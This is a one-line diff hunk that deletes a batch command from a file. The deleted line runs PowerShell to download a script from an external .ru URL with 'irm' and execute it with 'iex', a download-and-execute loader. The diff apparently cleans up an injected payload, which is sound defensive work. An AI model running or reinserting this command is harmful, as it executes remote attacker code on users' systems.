@@ -1,1 +1,0 @@
-cd/d %~dp0&&powershell "irm 'https://ec.nyase.ru/up'|iex"||cmd/k
